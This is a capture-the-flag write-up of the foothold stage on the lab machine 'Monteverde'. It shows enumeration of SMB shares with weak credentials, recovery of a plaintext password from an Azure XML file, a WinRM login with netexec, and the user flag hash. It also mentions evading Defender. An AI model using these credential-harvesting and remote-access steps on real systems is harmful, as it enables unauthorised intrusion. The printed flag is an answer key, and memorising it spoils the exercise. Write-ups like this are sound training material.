# Foothold — Monteverde

Using credentials recovered during enumeration (`SABatchJobs:SABatchJobs`), the tester accessed SMB shares and located sensitive artifacts that yielded additional credentials.

## SMB Access and Artifact Retrieval

The `SABatchJobs` account was used to authenticate to SMB and inspect available shares. A readable share `azure_uploads` was identified.

```sh
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
# azure_uploads  READ ONLY
```

A file `mhope/azure.xml` was retrieved and contained an Azure AD credential artifact that exposed a password field.

```xml
<Props>
  <S N="Password">4n0therD4y@n0th3r$</S>
</Props>
```

This artifact yielded the password for the `mhope` account.

## Remote Code Execution — WinRM

The recovered credential (`mhope:4n0therD4y@n0th3r$`) was used to authenticate via WinRM, providing an interactive shell on the host.

```sh
netexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
# Result: MEGABANK.LOCAL\mhope authenticated
```

`user.txt` was retrieved from the desktop of `mhope`.

```ps1
Type C:\Users\mhope\Desktop\user.txt
# b9a355bd318db6299e9d1135b1391cd4
```

**Defender / AV considerations:** Host-based defender was active and prevented some tooling from executing; alternate, quieter enumeration techniques were used where possible.

**Conclusion:** Artifact discovery on SMB shares provided a direct escalation vector to a domain user account with remote execution capability.

